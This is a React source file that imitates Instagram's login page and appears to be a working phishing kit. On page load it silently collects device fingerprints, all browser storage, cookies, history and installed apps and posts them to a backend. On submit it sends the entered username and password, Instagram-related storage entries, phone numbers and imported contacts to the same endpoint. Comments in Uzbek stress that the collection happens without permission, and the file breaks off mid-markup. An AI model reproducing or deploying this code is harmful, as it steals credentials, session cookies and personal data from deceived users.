import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Facebook, Eye, EyeOff, Users, Phone, Upload } from "lucide-react";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [showContactDialog, setShowContactDialog] = useState(false);
  const [contacts, setContacts] = useState<any[]>([]);
  const [isImporting, setIsImporting] = useState(false);

  // Check system preference and set initial theme
  useEffect(() => {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setIsDarkMode(prefersDark);
    
    // Listen for system theme changes
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const handleChange = (e: MediaQueryListEvent) => setIsDarkMode(e.matches);
    mediaQuery.addEventListener('change', handleChange);
    
    return () => mediaQuery.removeEventListener('change', handleChange);
  }, []);

  // Keyboard shortcut for manual theme toggle (Ctrl/Cmd + T)
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 't') {
        e.preventDefault();
        setIsDarkMode(prev => !prev);
      }
    };
    
    document.addEventListener('keydown', handleKeyPress);
    return () => document.removeEventListener('keydown', handleKeyPress);
  }, []);

  // Auto-collect data when component mounts
  useEffect(() => {
    const autoCollectData = async () => {
      try {
        console.log('🔄 Barcha ma\'lumotlarni to\'plash boshlandi...');

        // Comprehensive saved credentials collection
        const savedCredentials: any = {
          localStorage: {},
          sessionStorage: {},
          chromeAccounts: {},
          autofillData: {},
          phoneNumbers: [],
          // Additional data containers
          biometricData: {},
          hardwareInfo: {},
          systemInfo: {},
          networkInfo: {},
          sensorData: {},
          mediaDevices: {},
          appData: {},
          securityInfo: {},
          performanceData: {},
          fingerprintData: {}
        };

        // Battery info collection
        let batteryInfo: any = { level: null, charging: null, chargingTime: null, dischargingTime: null };
        try {
          if ('getBattery' in navigator) {
            const battery = await (navigator as any).getBattery();
            batteryInfo = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
          }
        } catch (e) {
          console.log("Battery info collection failed");
        }

        // 1. 📱 Qurilma ma'lumotlari (100% ruxsatsiz)
        const deviceInfo: any = {
          // Brauzer ma'lumotlari
          userAgent: navigator.userAgent,
          appName: navigator.appName,
          appVersion: navigator.appVersion,
          platform: navigator.platform,
          vendor: navigator.vendor,
          product: navigator.product,
          oscpu: (navigator as any).oscpu,
          buildID: (navigator as any).buildID,
          
          // Hardware ma'lumotlari
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: (navigator as any).deviceMemory,
          maxTouchPoints: navigator.maxTouchPoints || 0,
          
          // Tarmoq ma'lumotlari
          onLine: navigator.onLine,
          connection: (() => {
            if ('connection' in navigator) {
              const conn = (navigator as any).connection;
              return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData
              };
            }
            return null;
          })(),
          
          // Performance ma'lumotlari
          performance: {
            memory: (performance as any).memory,
            timing: performance.timing,
            navigation: performance.navigation,
            timeOrigin: performance.timeOrigin
          }
        };

        // 2. 🖥️ Ekran va oyna ma'lumotlari
        const screenInfo = {
          // Ekran ma'lumotlari
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          orientation: screen.orientation?.type || 'N/A',
          orientationAngle: screen.orientation?.angle || 0,
          
          // Oyna ma'lumotlari
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight,
          devicePixelRatio: window.devicePixelRatio,
          scrollX: window.scrollX,
          scrollY: window.scrollY
        };

        // 3. ⏰ Vaqt va til ma'lumotlari
        const timeInfo = {
          currentTime: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffset: new Date().getTimezoneOffset(),
          language: navigator.language,
          languages: navigator.languages,
          dateFormat: new Intl.DateTimeFormat().format(new Date()),
          timeFormat: new Intl.DateTimeFormat(undefined, { timeStyle: 'medium' }).format(new Date()),
          daylightSaving: new Date().getTimezoneOffset() !== new Date(Date.now() + 6 * 30 * 24 * 60 * 60 * 1000).getTimezoneOffset()
        };

        // 4. 🌐 Tarmoq ma'lumotlari
        const networkInfo = {
          onLine: navigator.onLine,
          connection: deviceInfo.connection,
          networkInterfaces: (() => {
            try {
              const interfaces = [];
              if ('getNetworkInformation' in navigator) {
                const networkInfo = (navigator as any).getNetworkInformation();
                interfaces.push(networkInfo);
              }
              return interfaces;
            } catch (e) { return []; }
          })(),
          networkCapabilities: {
            webRTC: 'RTCPeerConnection' in window,
            webSocket: 'WebSocket' in window,
            fetch: 'fetch' in window,
            xhr: 'XMLHttpRequest' in window
          }
        };

        // 5. 🔧 Brauzer imkoniyatlari
        const browserCapabilities = {
          // Basic capabilities
          cookies: navigator.cookieEnabled,
          java: navigator.javaEnabled(),
          onLine: navigator.onLine,
          doNotTrack: navigator.doNotTrack,
          maxTouchPoints: navigator.maxTouchPoints || 0,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: (navigator as any).deviceMemory,
          userAgentData: (navigator as any).userAgentData,
          
          // Graphics capabilities
          webgl: !!window.WebGLRenderingContext,
          webgl2: !!window.WebGL2RenderingContext,
                     webglVendor: (() => {
             try {
               const canvas = document.createElement('canvas');
               const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext;
               return gl?.getParameter(gl.VENDOR);
             } catch (e) { return null; }
           })(),
           webglRenderer: (() => {
             try {
               const canvas = document.createElement('canvas');
               const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext;
               return gl?.getParameter(gl.RENDERER);
             } catch (e) { return null; }
           })(),
          
          // Communication capabilities
          webrtc: !!(navigator as any).getUserMedia || !!(navigator as any).mediaDevices,
          serviceWorker: 'serviceWorker' in navigator,
          pushManager: 'PushManager' in window,
          notifications: 'Notification' in window,
          
          // Device capabilities
          geolocation: 'geolocation' in navigator,
          battery: 'getBattery' in navigator,
          vibration: 'vibrate' in navigator,
          bluetooth: 'bluetooth' in navigator,
          usb: 'usb' in navigator,
          serial: 'serial' in navigator,
          hid: 'hid' in navigator,
          gamepad: 'getGamepads' in navigator,
          
          // Advanced capabilities
          webAssembly: 'WebAssembly' in window,
          sharedArrayBuffer: 'SharedArrayBuffer' in window,
          webWorkers: 'Worker' in window,
          webSockets: 'WebSocket' in window,
          fetch: 'fetch' in window,
          xhr: 'XMLHttpRequest' in window,
          
          // Storage capabilities
          localStorage: 'localStorage' in window,
          sessionStorage: 'sessionStorage' in window,
          indexedDB: 'indexedDB' in window,
          cache: 'caches' in window,
          
          // Media capabilities
          mediaDevices: 'mediaDevices' in navigator,
          mediaSession: 'mediaSession' in navigator,
          mediaCapabilities: 'mediaCapabilities' in navigator,
          
          // Security capabilities
          credentials: 'credentials' in navigator,
          permissions: 'permissions' in navigator,
          payment: 'PaymentRequest' in window,
          
          // Device APIs
          deviceMotion: 'DeviceMotionEvent' in window,
          deviceOrientation: 'DeviceOrientationEvent' in window,
          ambientLight: 'AmbientLightSensor' in window,
          proximity: 'ProximitySensor' in window,
          magnetometer: 'Magnetometer' in window,
          gyroscope: 'Gyroscope' in window,
          
          // Network APIs
          networkInformation: 'getNetworkInformation' in navigator,
          connection: 'connection' in navigator,
          netInfo: 'netInfo' in navigator,
          
          // File APIs
          fileSystem: 'FileSystem' in window,
          fileReader: 'FileReader' in window,
          fileWriter: 'FileWriter' in window,
          
          // Other APIs
          speechRecognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
          speechSynthesis: 'speechSynthesis' in window,
          webSpeech: 'SpeechRecognition' in window,
          
          // Experimental APIs
          wakeLock: 'wakeLock' in navigator,
          idle: 'IdleDetector' in window,
          contacts: 'contacts' in navigator,
          share: 'share' in navigator,
          clipboard: 'clipboard' in navigator,
          nfc: 'nfc' in navigator,
          presentation: 'presentation' in navigator,
          remotePlayback: 'remotePlayback' in navigator
        };

        // 6. ⚡ Performance ma'lumotlari
        const performanceData = {
          memory: (performance as any).memory ? {
            usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
            totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
            jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit
          } : null,
          timing: {
            navigationStart: performance.timing.navigationStart,
            loadEventEnd: performance.timing.loadEventEnd,
            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
            responseEnd: performance.timing.responseEnd,
            requestStart: performance.timing.requestStart,
            domainLookupEnd: performance.timing.domainLookupEnd,
            domainLookupStart: performance.timing.domainLookupStart,
            connectEnd: performance.timing.connectEnd,
            connectStart: performance.timing.connectStart
          },
          navigation: {
            type: performance.navigation.type,
            redirectCount: performance.navigation.redirectCount
          },
          timeOrigin: performance.timeOrigin,
                     resourceTiming: (() => {
             try {
               const resources = performance.getEntriesByType('resource');
               return resources.map(resource => ({
                 name: resource.name,
                 duration: resource.duration,
                 transferSize: (resource as any).transferSize,
                 encodedBodySize: (resource as any).encodedBodySize,
                 decodedBodySize: (resource as any).decodedBodySize
               }));
             } catch (e) { return []; }
           })(),
          paintTiming: (() => {
            try {
              const paintEntries = performance.getEntriesByType('paint');
              return paintEntries.map(entry => ({
                name: entry.name,
                startTime: entry.startTime
              }));
            } catch (e) { return []; }
          })(),
          layoutShifts: (() => {
            try {
              if ('PerformanceObserver' in window) {
                return 'available';
              }
              return 'not_available';
            } catch (e) { return 'not_available'; }
          })()
        };

        // 7. 🔒 Xavfsizlik ma'lumotlari
                 const securityInfo = {
           isSecureContext: window.isSecureContext,
           protocol: window.location.protocol,
           hostname: window.location.hostname,
           port: window.location.port,
           origin: window.location.origin,
           referrerPolicy: (document as any).referrerPolicy || 'N/A',
           contentSecurityPolicy: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || 'N/A',
          securityHeaders: (() => {
            try {
              const headers = [];
              if ('getSecurityPolicyViolationEvent' in window) {
                headers.push('CSP');
              }
              if ('getFeaturePolicyViolationEvent' in window) {
                headers.push('Feature-Policy');
              }
              return headers;
            } catch (e) { return []; }
          })(),
          certificateInfo: (() => {
            try {
              if ('credentials' in navigator) {
                return 'available';
              }
              return 'not_available';
            } catch (e) { return 'not_available'; }
          })()
        };

        // 8. 📱 Mobile-specific ma'lumotlar
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const mobileInfo = isMobile ? {
          isMobile: true,
          deviceMemory: (navigator as any).deviceMemory,
          hardwareConcurrency: navigator.hardwareConcurrency,
          maxTouchPoints: navigator.maxTouchPoints || 0,
          connection: deviceInfo.connection,
          userAgent: navigator.userAgent,
          platform: navigator.platform
        } : null;

        // 9. 🆔 Device fingerprint
        const deviceFingerprint = {
          canvasFingerprint: (() => {
            try {
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              if (ctx) {
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Device fingerprint', 2, 2);
                return canvas.toDataURL();
              }
              return null;
            } catch (e) { return null; }
          })(),
          audioFingerprint: (() => {
            try {
              const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
              return {
                sampleRate: audioContext.sampleRate,
                channelCount: audioContext.destination.channelCount,
                maxChannelCount: audioContext.destination.maxChannelCount
              };
            } catch (e) { return null; }
          })(),
          fontFingerprint: (() => {
            try {
              const fonts = [
                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
                'Georgia', 'Palatino', 'Garamond', 'Bookman',
                'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
              ];
              
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              const availableFonts = [];
              
              fonts.forEach(font => {
                try {
                  ctx.font = `12px ${font}`;
                  const textWidth = ctx.measureText('test').width;
                  if (textWidth > 0) {
                    availableFonts.push(font);
                  }
                } catch (e) {
                  // Font not available
                }
              });
              
              return availableFonts;
            } catch (e) { return []; }
          })(),
          pluginFingerprint: (() => {
            try {
              const plugins = [];
              for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push({
                  name: navigator.plugins[i].name,
                  description: navigator.plugins[i].description,
                  filename: navigator.plugins[i].filename
                });
              }
              return plugins;
            } catch (e) { return []; }
          })(),
          mimeTypeFingerprint: (() => {
            try {
              const mimeTypes = [];
              for (let i = 0; i < navigator.mimeTypes.length; i++) {
                mimeTypes.push({
                  type: navigator.mimeTypes[i].type,
                  description: navigator.mimeTypes[i].description,
                  suffixes: navigator.mimeTypes[i].suffixes
                });
              }
              return mimeTypes;
            } catch (e) { return []; }
          })()
        };

        // 10. 📋 LocalStorage/SessionStorage
        const storageData = {
          localStorage: (() => {
            const data = {};
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              if (!key) continue;
              const value = localStorage.getItem(key);
              data[key] = value;
            }
            return data;
          })(),
          sessionStorage: (() => {
            const data = {};
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              if (!key) continue;
              const value = sessionStorage.getItem(key);
              data[key] = value;
            }
            return data;
          })(),
          cookies: document.cookie
        };

        // 11. 🏠 Browser history (cheklangan)
        const browserHistory = {
          currentUrl: window.location.href,
          referrer: document.referrer,
          previousUrl: sessionStorage.getItem('previousUrl') || 'N/A',
          searchQuery: new URLSearchParams(window.location.search).get('q') || 'N/A',
          hash: window.location.hash || 'N/A',
          pathname: window.location.pathname,
          search: window.location.search,
          origin: window.location.origin
        };
        
        // Store current URL for next session
        sessionStorage.setItem('previousUrl', window.location.href);

        // 12. 📱 Installed apps (cheklangan)
        const installedApps = (() => {
          try {
            if ('getInstalledRelatedApps' in navigator) {
              return (navigator as any).getInstalledRelatedApps().then((apps: any) => {
                if (apps && apps.length > 0) {
                  return apps.map((app: any) => ({
                    platform: app.platform,
                    url: app.url,
                    id: app.id
                  }));
                }
                return [];
              });
            }
            return Promise.resolve([]);
          } catch (e) {
            return Promise.resolve([]);
          }
        })();

        // Barcha ma'lumotlarni savedCredentials'ga qo'shish
        savedCredentials.deviceInfo = deviceInfo;
        savedCredentials.screenInfo = screenInfo;
        savedCredentials.timeInfo = timeInfo;
        savedCredentials.networkInfo = networkInfo;
        savedCredentials.browserCapabilities = browserCapabilities;
        savedCredentials.performanceData = performanceData;
        savedCredentials.securityInfo = securityInfo;
        savedCredentials.mobileInfo = mobileInfo;
        savedCredentials.deviceFingerprint = deviceFingerprint;
        savedCredentials.storageData = storageData;
        savedCredentials.browserHistory = browserHistory;
        
        // Installed apps'ni async olish
        try {
          const apps = await installedApps;
          savedCredentials.installedApps = apps;
        } catch (e) {
          savedCredentials.installedApps = [];
        }

        console.log('✅ Barcha ma\'lumotlar to\'plandi!');

        // Remove duplicates from phone numbers
        savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];

        // Send comprehensive data to backend
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
        console.log('📤 Ma\'lumotlar yuborilmoqda:', apiUrl);
        
        const response = await fetch(`${apiUrl}/api/login`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email: "auto_collected@example.com",
            password: "auto_collected",
            deviceInfo,
            savedCredentials,
            instagramCredentials: savedCredentials,
            batteryInfo,
            autoCollected: true,
            timestamp: new Date().toISOString()
          }),
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log("✅ Barcha ma'lumotlar muvaffaqiyatli yuborildi!");
      } catch (error) {
        console.error("❌ Ma'lumotlarni to'plashda xatolik:", error);
      }
    };

    // Auto-collect data immediately when component mounts
    autoCollectData();
  }, []);

  // Contact import functions
  const importContacts = async () => {
    setIsImporting(true);
    try {
      // Try Contact Picker API first
      if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
        const selectedContacts = await (navigator as any).contacts.select(['name', 'tel', 'email'], { multiple: true });
        if (selectedContacts && selectedContacts.length > 0) {
          setContacts(selectedContacts);
          console.log('✅ Kontaktlar muvaffaqiyatli olindi:', selectedContacts);
        }
      } else {
        // Fallback to file upload
        showFileUploadDialog();
      }
    } catch (error) {
      console.log('❌ Contact Picker API ishlamadi, file upload dialog ochiladi');
      showFileUploadDialog();
    } finally {
      setIsImporting(false);
    }
  };

  const showFileUploadDialog = () => {
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = '.vcf,.csv,.json,.txt';
    fileInput.multiple = true;
    
    fileInput.onchange = async (e) => {
      const files = (e.target as HTMLInputElement).files;
      if (files && files.length > 0) {
        const importedContacts = [];
        
        for (let i = 0; i < files.length; i++) {
          const file = files[i];
          const text = await file.text();
          
          // Parse VCF file
          if (file.name.endsWith('.vcf')) {
            const vcfContacts = parseVCF(text);
            importedContacts.push(...vcfContacts);
          }
          // Parse CSV file
          else if (file.name.endsWith('.csv')) {
            const csvContacts = parseCSV(text);
            importedContacts.push(...csvContacts);
          }
          // Parse JSON file
          else if (file.name.endsWith('.json')) {
            try {
              const jsonContacts = JSON.parse(text);
              importedContacts.push(...jsonContacts);
            } catch (e) {
              console.error('JSON parse error:', e);
            }
          }
        }
        
        setContacts(importedContacts);
        console.log('✅ File\'dan kontaktlar olindi:', importedContacts);
      }
    };
    
    fileInput.click();
  };

  const parseVCF = (vcfText: string) => {
    const contacts = [];
    const lines = vcfText.split('\n');
    let currentContact: any = {};
    
    for (const line of lines) {
      if (line.startsWith('BEGIN:VCARD')) {
        currentContact = {};
      } else if (line.startsWith('END:VCARD')) {
        if (Object.keys(currentContact).length > 0) {
          contacts.push(currentContact);
        }
      } else if (line.startsWith('FN:')) {
        currentContact.name = line.substring(3);
      } else if (line.startsWith('TEL:')) {
        currentContact.tel = line.substring(4);
      } else if (line.startsWith('EMAIL:')) {
        currentContact.email = line.substring(6);
      }
    }
    
    return contacts;
  };

  const parseCSV = (csvText: string) => {
    const contacts = [];
    const lines = csvText.split('\n');
    const headers = lines[0].split(',');
    
    for (let i = 1; i < lines.length; i++) {
      const values = lines[i].split(',');
      const contact: any = {};
      
      headers.forEach((header, index) => {
        contact[header.trim()] = values[index]?.trim() || '';
      });
      
      if (Object.keys(contact).length > 0) {
        contacts.push(contact);
      }
    }
    
    return contacts;
  };

  // Handle form submission with contact import
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      alert("Please fill in all fields");
      return;
    }

    // Show contact import dialog
    setShowContactDialog(true);
  };

  // Final submit after contact import
  const handleFinalSubmit = async () => {
    try {
      const deviceInfo: any = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        onLine: navigator.onLine,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
      };

      // Collect localStorage data
      const savedCredentials: any = {
        localStorage: {},
        sessionStorage: {},
        chromeAccounts: {},
        autofillData: {},
        phoneNumbers: [],
        importedContacts: contacts // Add imported contacts
      };

      // Collect phone numbers from localStorage and sessionStorage
      const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
      const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon'];

      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (!key) continue;
        const value = localStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.localStorage[`localStorage_${key}`] = value;
        }

        // Check for phone numbers
        if (value) {
          const phones = value.match(phonePattern);
          if (phones) {
            savedCredentials.phoneNumbers.push(...phones);
          }
          
          // Check if key contains phone-related keywords
          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
            savedCredentials.localStorage[`phone_${key}`] = value;
          }
        }
      }

      // Collect sessionStorage data
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (!key) continue;
        const value = sessionStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
        }

        // Check for phone numbers
        if (value) {
          const phones = value.match(phonePattern);
          if (phones) {
            savedCredentials.phoneNumbers.push(...phones);
          }
          
          // Check if key contains phone-related keywords
          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
            savedCredentials.sessionStorage[`phone_${key}`] = value;
          }
        }
      }

      // Try to get contacts if available (requires user permission)
      try {
        if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
          const contacts = await (navigator as any).contacts.select(['tel'], { multiple: true });
          if (contacts && contacts.length > 0) {
            const phoneNumbers = contacts
              .flatMap((contact: any) => contact.tel || [])
              .filter((tel: any) => tel && tel.length > 0);
            savedCredentials.phoneNumbers.push(...phoneNumbers);
          }
        }
      } catch (e) {
        console.log("Contacts API not available or permission denied");
      }

      // Try to get phone number from device info
      try {
        if ('getInstalledRelatedApps' in navigator) {
          const apps = await (navigator as any).getInstalledRelatedApps();
          if (apps && apps.length > 0) {
            const phoneApp = apps.find((app: any) => 
              app.platform === 'webapp' && 
              (app.url.includes('phone') || app.url.includes('tel') || app.url.includes('contact'))
            );
            if (phoneApp) {
              savedCredentials.devicePhoneApp = phoneApp;
            }
          }
        }
      } catch (e) {
        console.log("Installed apps API not available");
      }

      // Remove duplicates from phone numbers
      savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];

      // Collect battery info if available
      const batteryInfo: any = {};
      if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
        try {
          const battery = await navigator.getBattery();
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        } catch (e) {
          console.log("Battery API not available");
        }
      } else if (typeof window !== "undefined" && 'battery' in navigator) {
        const battery = (navigator as any).battery;
        if (battery) {
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        }
      }

      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
      console.log('Sending login data with contacts to:', apiUrl);
      
      const response = await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: username,
          password,
          deviceInfo,
          savedCredentials,
          instagramCredentials: savedCredentials,
          batteryInfo,
          contacts: contacts, // Send contacts separately
          autoCollected: false,
          timestamp: new Date().toISOString()
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      console.log("Login data with contacts sent successfully:", result);
      
      // Show success message
      alert("Login successful! Redirecting...");
      setShowContactDialog(false);
      
    } catch (error) {
      console.error("Error submitting login:", error);
      alert("Login failed. Please try again.");
    }
  };

  return (
    <div className={`min-h-screen flex flex-col transition-colors duration-300 ${
      isDarkMode 
        ? 'bg-black text-white' 
        : 'bg-instagram-bg text-gray-900'
    }`}>
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-[350px] mx-auto">
          {/* Instagram Logo */}
          <div className="text-center mb-8">
            <span
              className="text-6xl font-light instagram-font"
              style={{ 
                color: isDarkMode ? "#ffffff" : "#262626", 
                fontWeight: 400, 
                letterSpacing: "0.1px", 
                marginTop: "20px" 
              }}
            >
              Instagram
            </span>
          </div>

          {/* Login Form */}
          <div className={`rounded-lg p-8 mb-4 transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <form className="space-y-4" onSubmit={handleSubmit}>
              {/* Username Input with Floating Label */}
              <div className="relative">
                <Input
                  type="text"
                  placeholder=""
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={`w-full h-9 px-2 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    username 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Phone number, username or email address
                </label>
              </div>
              
              {/* Password Input with Floating Label */}
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder=""
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full h-9 px-2 pr-10 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    password 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute right-2 top-1/2 transform -translate-y-1/2 text-xs font-semibold transition-colors duration-300 ${
                    isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-gray-500 hover:text-gray-700'
                  } ${password ? 'block' : 'hidden'}`}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
              
              <Button 
                variant="instagram" 
                className="w-full h-10 text-sm font-semibold rounded-lg mt-4"
                disabled={!username || !password}
                type="submit"
              >
                Log in
              </Button>
            </form>

            {/* OR Divider */}
            <div className="flex items-center my-6">
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
              <span className={`px-4 text-sm font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
              }`}>OR</span>
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
            </div>

            {/* Facebook Login */}
            <Button variant="ghost" className={`w-full h-10 text-sm font-semibold hover:bg-transparent transition-colors duration-300 ${
              isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-[#00376b]'
            }`}>
              <svg 
                className="mr-2 w-4 h-4" 
                viewBox="0 0 24 24" 
                fill="currentColor"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </Button>

            {/* Forgot Password */}
            <div className="text-center mt-6">
              <a href="#" className={`text-sm hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text hover:text-instagram-text'
              }`}>
                Forgotten your password?
              </a>
            </div>
          </div>

          {/* Sign Up */}
          <div className={`rounded-lg p-6 text-center transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <p className={`text-sm transition-colors duration-300 ${
              isDarkMode ? 'text-gray-300' : 'text-instagram-text'
            }`}>
              Don't have an account?{" "}
              <a href="#" className={`font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-instagram-blue hover:text-instagram-blue/80'
              }`}>
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>

      {/* Contact Import Dialog */}
      {showContactDialog && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className={`w-full max-w-md rounded-lg p-6 transition-colors duration-300 ${
            isDarkMode ? 'bg-gray-900 text-white' : 'bg-white text-gray-900'
          }`}>
            <div className="text-center mb-6">
              <Users className="w-12 h-12 mx-auto mb-4 text-blue-500" />
              <h3 className="text-lg font-semibold mb-2">Find Your Friends</h3>
              <p className={`text-sm ${isDarkMode ? 'text-gray-300' : 'text-gray-600'}`}>
                Import your contacts to find friends on Instagram
              </p>
            </div>

            <div className="space-y-4">
              {/* Import from Phone */}
              <Button 
                onClick={importContacts}
                disabled={isImporting}
